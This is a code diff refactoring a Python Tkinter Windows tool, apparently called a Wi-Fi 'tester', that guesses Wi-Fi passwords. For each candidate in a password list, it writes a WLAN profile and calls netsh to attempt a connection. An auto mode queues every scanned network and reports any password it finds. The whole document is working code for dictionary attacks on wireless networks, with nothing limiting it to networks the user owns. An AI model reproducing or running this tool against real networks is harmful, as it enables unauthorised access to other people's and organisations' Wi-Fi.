-            self.toast("Add passwords first", "warning")
+            self._toast("Add passwords first", "warning")
             return
-
         if not self.is_admin:
-            result = messagebox.askyesno(
-                "Admin Required",
-                "Password testing requires Administrator privileges.\nContinue anyway?"
-            )
-            if not result:
+            if not messagebox.askyesno("Admin", "Testing needs Admin. Continue?"):
                 return
 
         self.auto_testing = True
-        self.auto_test_queue = networks_to_test[:]
-        self.auto_test_index = 0
+        self.auto_queue = nets[:]
+        self.auto_index = 0
 
         self.test_btn.set_enabled(False)
         self.auto_btn.set_enabled(False)
         self.stop_btn.set_enabled(True)
-        self.refresh_modern_btn.set_enabled(False)
-        self.pulse_indicator.start()
+        self.scan_btn.set_enabled(False)
+        self.pulse.start()
 
-        self.log(f"Auto-testing {len(networks_to_test)} network(s)...", "info")
-        self.toast(f"Auto-testing {len(networks_to_test)} networks", "info")
+        self._log(f"Auto-testing {len(nets)} network(s)...", "info")
+        self._toast(f"Auto-testing {len(nets)} networks", "info")
+        self._auto_next()
 
-        self._process_next_auto()
-
-    def _process_next_auto(self):
-        if not self.auto_testing or self.auto_test_index >= len(self.auto_test_queue):
+    def _auto_next(self):
+        if not self.auto_testing or self.auto_index >= len(self.auto_queue):
             self.auto_testing = False
             self.test_btn.set_enabled(True)
             self.auto_btn.set_enabled(True)
             self.stop_btn.set_enabled(False)
-            self.refresh_modern_btn.set_enabled(True)
-            self.pulse_indicator.stop()
+            self.scan_btn.set_enabled(True)
+            self.pulse.stop()
             self.status_var.set("Auto-test complete")
-            self.log("Auto-test cycle complete", "info")
-            self.toast("Auto-test complete", "success")
+            self._log("Auto-test complete", "info")
+            self._toast("Auto-test complete", "success")
             return
 
-        ssid = self.auto_test_queue[self.auto_test_index]
-        self.auto_test_index += 1
-
+        ssid = self.auto_queue[self.auto_index]
+        self.auto_index += 1
         self.current_network = ssid
-        self.status_var.set(f"Auto-testing [{self.auto_test_index}/{len(self.auto_test_queue)}]: {ssid}")
-        self.log(f"[{self.auto_test_index}/{len(self.auto_test_queue)}] Testing: {ssid}", "info")
+        self.status_var.set(f"[{self.auto_index}/{len(self.auto_queue)}] {ssid}")
+        self._log(f"[{self.auto_index}/{len(self.auto_queue)}] Testing {ssid}", "info")
 
-        # Update tree status
         if ssid in self.network_items:
             item = self.network_items[ssid]
-            vals = self.network_tree.item(item)['values']
-            self.network_tree.item(item, values=(vals[0], vals[1], vals[2], vals[3], "Testing..."))
+            v = self.tree.item(item)["values"]
+            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "Testing..."))
 
-        def test():
-            self.test_passwords(ssid, auto_mode=True)
+        def run():
+            self._test_pw(ssid, auto=True)
+        threading.Thread(target=run, daemon=True).start()
 
-        threading.Thread(target=test, daemon=True).start()
-
-    def stop_testing(self):
+    def _stop(self):
         self.testing = False
         self.auto_testing = False
-        self.auto_test_queue = []
-        self.auto_test_index = 0
-
+        self.auto_queue = []
+        self.auto_index = 0
         self.test_btn.set_enabled(True)
         self.auto_btn.set_enabled(True)
         self.stop_btn.set_enabled(False)
-        self.refresh_modern_btn.set_enabled(True)
-        self.pulse_indicator.stop()
-        self.status_var.set("Testing stopped")
-        self.log("Testing stopped by user", "warning")
+        self.scan_btn.set_enabled(True)
+        self.pulse.stop()
+        self.status_var.set("Stopped")
+        self._log("Stopped by user", "warning")
 
-    def test_passwords(self, ssid, auto_mode=False):
+    def _test_pw(self, ssid, auto=False):
         import tempfile
-
-        for idx, password in enumerate(self.password_db):
+        for idx, p in enumerate(self.password_db):
             if not self.testing and not self.auto_testing:
                 break
-
-            self.root.after(0, lambda p=password, i=idx:
-                           self.update_test_status(p, i, ssid))
-
-            if self.try_connect(ssid, password):
-                self.root.after(0, lambda p=password: self.password_found(ssid, p, auto_mode))
+            self.root.after(0, lambda pw=p, i=idx:
+                           self._status(pw, i, ssid))
+            if self._connect(ssid, p):
+                self.root.after(0, lambda pw=p: self._found(ssid, pw, auto))
                 return
-
-        # Password not found for this network
-        if auto_mode:
-            self.root.after(0, lambda: self._auto_network_complete(ssid, False))
+        if auto:
+            self.root.after(0, lambda: self._auto_done(ssid, False))
         else:
-            self.root.after(0, lambda: self.testing_complete(ssid))
+            self.root.after(0, lambda: self._complete(ssid))
 
-    def _auto_network_complete(self, ssid, found):
-        if found:
-            # Mark as found in tree
-            if ssid in self.network_items:
-                item = self.network_items[ssid]
-                vals = self.network_tree.item(item)['values']
-                self.network_tree.item(item, values=(vals[0], vals[1], vals[2], vals[3], "✅ FOUND"))
-        else:
-            if ssid in self.network_items:
-                item = self.network_items[ssid]
-                vals = self.network_tree.item(item)['values']
-                self.network_tree.item(item, values=(vals[0], vals[1], vals[2], vals[3], "❌ Failed"))
+    def _auto_done(self, ssid, found):
+        if ssid in self.network_items:
+            item = self.network_items[ssid]
+            v = self.tree.item(item)["values"]
+            self.tree.item(item, values=(v[0], v[1], v[2], v[3],
+                                        "✅ FOUND" if found else "❌ Failed"))
+        self.root.after(600, self._auto_next)
 
-        # Move to next network
-        self.root.after(500, self._process_next_auto)
+    def _connect(self, ssid, password):
+        try:
+            import tempfile, os
+            xml = self._xml(ssid, password)
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".xml",
+                                            delete=False, encoding="utf-8") as f:
+                f.write(xml)
+                xp = f.name
+            try:
+                r1 = subprocess.run(["netsh", "wlan", "add", "profile",
+                                    f"filename={xp}"], capture_output=True,
+                                    text=True, timeout=5, creationflags=CREATE_NO_WINDOW)
+                if r1.returncode != 0:
+                    return False
+                r2 = subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"],
+                                   capture_output=True, text=True, timeout=8,
+                                   creationflags=CREATE_NO_WINDOW)
+                if r2.returncode != 0:
+                    subprocess.run(["netsh", "wlan", "delete", "profile",
+                                   f"name={ssid}"], capture_output=True,
+                                   timeout=3, creationflags=CREATE_NO_WINDOW)
+                    return False
+                time.sleep(1)
+                r3 = subprocess.run(["netsh", "wlan", "show", "interfaces"],
+                                   capture_output=True, text=True, timeout=3,
+                                   creationflags=CREATE_NO_WINDOW)
+                connected = False
+                if r3.returncode == 0:
+                    cssid = st = None
+                    for line in r3.stdout.split("\n"):
+                        line = line.strip()
+                        if line.startswith("SSID") and ":" in line:
+                            cssid = line.split(":", 1)[1].strip()
+                        elif line.startswith("State") and ":" in line:
+                            st = line.split(":", 1)[1].strip()
+                    if cssid == ssid and st == "connected":
+                        connected = True
+                subprocess.run(["netsh", "wlan", "disconnect"],
+                              capture_output=True, timeout=3, creationflags=CREATE_NO_WINDOW)
+                subprocess.run(["netsh", "wlan", "delete", "profile",
+                               f"name={ssid}"], capture_output=True,
+                               timeout=3, creationflags=CREATE_NO_WINDOW)
+                return connected
+            finally:
+                try:
+                    os.unlink(xp)
+                except:
+                    pass
+        except Exception as e:
+            self._log(f"Error: {e}", "error")
+        return False
 
-    def create_profile_xml(self, ssid, password):
-        def escape_xml(text):
-            result = []
-            for ch in text:
-                if ch == "&":
-                    result.append("&amp;")
-                elif ch == "<":
-                    result.append("&lt;")
-                elif ch == ">":
-                    result.append("&gt;")
-                elif ch == '"':
-                    result.append("&quot;")
-                elif ch == "'":
-                    result.append("&apos;")
-                else:
-                    result.append(ch)
-            return "".join(result)
-
-        ssid_e = escape_xml(ssid)
-        pwd_e = escape_xml(password)
-
-        return '\n'.join([
+    def _xml(self, ssid, pwd):
+        def esc(t):
+            r = []
+            for ch in t:
+                if ch == "&": r.append("&amp;")
+                elif ch == "<": r.append("&lt;")
+                elif ch == ">": r.append("&gt;")
+                elif ch == '"': r.append("&quot;")
+                elif ch == "'": r.append("&apos;")
+                else: r.append(ch)
+            return "".join(r)
+        s = esc(ssid); p = esc(pwd)
+        return "\n".join([
             '<?xml version="1.0"?>',
             '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">',
-            f'    <name>{ssid_e}</name>',
-            '    <SSIDConfig><SSID><name>' + ssid_e + '</name></SSID></SSIDConfig>',
+            f"    <name>{s}</name>",
+            '    <SSIDConfig><SSID><name>' + s + '</name></SSID></SSIDConfig>',
             '    <connectionType>ESS</connectionType>',
             '    <connectionMode>manual</connectionMode>',
             '    <MSM><security><authEncryption>',
@@ -1255,180 +1027,95 @@ class AymoWiFiTesterV5:
             '    </authEncryption><sharedKey>',
             '        <keyType>passPhrase</keyType>',
             '        <protected>false</protected>',
-            f'        <keyMaterial>{pwd_e}</keyMaterial>',
+            f"        <keyMaterial>{p}</keyMaterial>",
             '    </sharedKey></security></MSM>',
             '</WLANProfile>'
         ])
 
-    def try_connect(self, ssid, password):
-        try:
-            import tempfile
-            import os
+    def _status(self, pw, idx, ssid):
+        self.status_var.set(f"Trying {idx+1}/{len(self.password_db)}: {pw[:12]}... ({ssid})")
+        self._log(f"#{idx+1}: {pw[:20]} for {ssid}", "info")
 
-            xml = self.create_profile_xml(ssid, password)
-            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml',
-                                            delete=False, encoding='utf-8') as f:
-                f.write(xml)
-                xml_path = f.name
-
-            try:
-                # Add profile - shorter timeout for speed
-                r1 = subprocess.run(
-                    ["netsh", "wlan", "add", "profile", f"filename={xml_path}"],
-                    capture_output=True, text=True, timeout=5, creationflags=CREATE_NO_WINDOW
-                )
-                if r1.returncode != 0:
-                    return False
-
-                # Connect - shorter timeout
-                r2 = subprocess.run(
-                    ["netsh", "wlan", "connect", f"name={ssid}"],
-                    capture_output=True, text=True, timeout=8, creationflags=CREATE_NO_WINDOW
-                )
-                if r2.returncode != 0:
-                    subprocess.run(["netsh", "wlan", "delete", "profile", f"name={ssid}"],
-                                  capture_output=True, timeout=3, creationflags=CREATE_NO_WINDOW)
-                    return False
-
-                # Shorter sleep for speed: 1 second instead of 3
-                time.sleep(1)
-
-                r3 = subprocess.run(
-                    ["netsh", "wlan", "show", "interfaces"],
-                    capture_output=True, text=True, timeout=3, creationflags=CREATE_NO_WINDOW
-                )
-
-                connected = False
-                if r3.returncode == 0:
-                    cur_ssid = None
-                    state = None
-                    for line in r3.stdout.split('\n'):
-                        line = line.strip()
-                        if line.startswith("SSID") and ":" in line:
-                            cur_ssid = line.split(":", 1)[1].strip()
-                        elif line.startswith("State") and ":" in line:
-                            state = line.split(":", 1)[1].strip()
-                    if cur_ssid == ssid and state == "connected":
-                        connected = True
-
-                # Quick cleanup
-                subprocess.run(["netsh", "wlan", "disconnect"],
-                              capture_output=True, timeout=3, creationflags=CREATE_NO_WINDOW)
-                subprocess.run(["netsh", "wlan", "delete", "profile", f"name={ssid}"],
-                              capture_output=True, timeout=3, creationflags=CREATE_NO_WINDOW)
-
-                return connected
-            finally:
-                try:
-                    os.unlink(xml_path)
-                except:
-                    pass
-        except Exception as e:
-            self.log(f"Error: {e}", "error")
-        return False
-
-    def update_test_status(self, password, index, ssid):
-        self.status_var.set(f"Testing {index+1}/{len(self.password_db)}: {password[:12]}... ({ssid})")
-        self.log(f"Trying #{index+1}: {password[:20]} for {ssid}", "info")
-
-    def password_found(self, ssid, password, auto_mode=False):
+    def _found(self, ssid, pw, auto=False):
         self.testing = False
         self.test_btn.set_enabled(True)
         self.stop_btn.set_enabled(False)
-        self.refresh_modern_btn.set_enabled(True)
-        self.pulse_indicator.stop()
-
-        self.status_var.set(f"✅ Password found: {ssid}")
-        self.log(f"SUCCESS! Password for '{ssid}': {password}", "success")
-        self.toast(f"Password found for {ssid}!", "success", 4000)
-
+        self.scan_btn.set_enabled(True)
+        self.pulse.stop()
+        self.status_var.set(f"✅ Found: {ssid}")
+        self._log(f"SUCCESS! {ssid}: {pw}", "success")
+        self._toast(f"Password found: {ssid}", "success", 4000)
         if ssid in self.network_items:
             item = self.network_items[ssid]
-            vals = self.network_tree.item(item)['values']
-            self.network_tree.item(item, values=(vals[0], vals[1], vals[2], vals[3], "✅ FOUND"))
-
-        if auto_mode:
-            self.root.after(800, lambda: self._process_next_auto())
+            v = self.tree.item(item)["values"]
+            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "✅ FOUND"))
+        if auto:
+            self.root.after(800, self._auto_next)
         else:
-            self._show_success_dialog(ssid, password)
+            self._dialog(ssid, pw)
 
-    def testing_complete(self, ssid):
+    def _complete(self, ssid):
         self.testing = False
         self.test_btn.set_enabled(True)
         self.stop_btn.set_enabled(False)
-        self.refresh_modern_btn.set_enabled(True)
-        self.pulse_indicator.stop()
-
-        self.status_var.set(f"Testing complete - no match for {ssid}")
-        self.log(f"No matching password found for {ssid}", "warning")
-        self.toast(f"No match for {ssid}", "info")
-
+        self.scan_btn.set_enabled(True)
+        self.pulse.stop()
+        self.status_var.set(f"No match for {ssid}")
+        self._log(f"No match for {ssid}", "warning")
+        self._toast(f"No match for {ssid}", "info")
         if ssid in self.network_items:
             item = self.network_items[ssid]
-            vals = self.network_tree.item(item)['values']
-            self.network_tree.item(item, values=(vals[0], vals[1], vals[2], vals[3], "❌ Failed"))
+            v = self.tree.item(item)["values"]
+            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "❌ Failed"))
 
-    def _show_success_dialog(self, ssid, password):
-        dialog = tk.Toplevel(self.root)
-        dialog.title("Password Found!")
-        dialog.geometry("380x260")
-        dialog.configure(bg=DesignTokens.BG_APP)
-        dialog.transient(self.root)
-        dialog.grab_set()
+    def _dialog(self, ssid, pw):
+        d = tk.Toplevel(self.root)
+        d.title("Password Found!")
+        d.geometry("360x240")
+        d.configure(bg=C["bg"])
+        d.transient(self.root)
+        d.grab_set()
+        d.update_idletasks()
+        x = self.root.winfo_x() + self.root.winfo_width() // 2 - 180
+        y = self.root.winfo_y() + self.root.winfo_height() // 2 - 120
+        d.geometry(f"+{x}+{y}")
 
-        dialog.update_idletasks()
-        x = self.root.winfo_x() + (self.root.winfo_width() // 2) - 190
-        y = self.root.winfo_y() + (self.root.winfo_height() // 2) - 130
-        dialog.geometry(f"+{x}+{y}")
-
-        card = GlassCard(dialog, padding=24)
+        card = tk.Frame(d, bg=C["card"], highlightbackground=C["border_focus"],
+                       highlightthickness=1)
         card.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
 
-        icon_canvas = tk.Canvas(card, width=64, height=64,
-                               highlightthickness=0, bg=DesignTokens.BG_CARD)
-        icon_canvas.pack(pady=(0, 16))
-        icon_canvas.create_oval(2, 2, 62, 62, fill=DesignTokens.ACCENT_SUCCESS, outline="")
-        icon_canvas.create_text(32, 32, text="✓", fill="#ffffff",
-                               font=(DesignTokens.FONT_FAMILY, 26, "bold"))
+        ic = tk.Canvas(card, width=56, height=56, highlightthickness=0, bg=C["card"])
+        ic.pack(pady=(0, 14))
+        ic.create_oval(2, 2, 54, 54, fill=C["success"], outline="")
+        ic.create_text(28, 28, text="✓", fill="#ffffff",
+                      font=(C["font"], 22, "bold"))
 
-        tk.Label(card, text="Password Found!", font=(DesignTokens.FONT_FAMILY, 16, "bold"),
-                fg=DesignTokens.TEXT_PRIMARY, bg=DesignTokens.BG_CARD).pack(pady=(0, 8))
-        tk.Label(card, text=f"Network: {ssid}", font=(DesignTokens.FONT_FAMILY, 11),
-                fg=DesignTokens.TEXT_SECONDARY, bg=DesignTokens.BG_CARD).pack()
-        tk.Label(card, text=f"Password: {password}", font=(DesignTokens.FONT_MONO, 11, "bold"),
-                fg=DesignTokens.ACCENT_SUCCESS, bg=DesignTokens.BG_CARD).pack(pady=(6, 0))
+        tk.Label(card, text="Password Found!", font=(C["font"], 14, "bold"),
+                fg=C["text"], bg=C["card"]).pack(pady=(0, 6))
+        tk.Label(card, text=f"Network: {ssid}", font=(C["font"], 10),
+                fg=C["text_second"], bg=C["card"]).pack()
+        tk.Label(card, text=f"Password: {pw}", font=(C["mono"], 10, "bold"),
+                fg=C["success"], bg=C["card"]).pack(pady=(6, 0))
 
-        ModernButton(card, "Close", command=dialog.destroy,
-                    bg=DesignTokens.ACCENT_PRIMARY,
-                    width=140, height=36, radius=6, font_size=10).pack(pady=(18, 0))
-
-    def relaunch_as_admin(self):
-        try:
-            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
-            subprocess.run([
-                "powershell", "-Command",
-                f"Start-Process '{exe_path}' -Verb RunAs"
-            ], check=False, creationflags=CREATE_NO_WINDOW)
-            self.root.after(500, self.root.destroy)
-        except Exception as e:
-            self.log(f"Relaunch failed: {e}", "error")
+        ModernButton(card, "Close", command=d.destroy,
+                    bg=C["orange"], width=120, height=34, radius=6, font_size=10).pack(pady=(16, 0))
 
 
 def main():
     root = tk.Tk()
     root.update_idletasks()
-    x = (root.winfo_screenwidth() // 2) - 600
-    y = (root.winfo_screenheight() // 2) - 375
-    root.geometry(f"1200x750+{x}+{y}")
+    x = (root.winfo_screenwidth() // 2) - 550
+    y = (root.winfo_screenheight() // 2) - 350
+    root.geometry(f"1100x700+{x}+{y}")
 
     try:
-        icon_path = Path(__file__).parent / "wifi_icon.ico"
-        if icon_path.exists():
-            root.iconbitmap(str(icon_path))
+        ico = Path(__file__).parent / "wifi_icon.ico"
+        if ico.exists():
+            root.iconbitmap(str(ico))
     except:
         pass
 
-    app = AymoWiFiTesterV5(root)
+    AymoWiFiTester(root)
     root.mainloop()
 
 
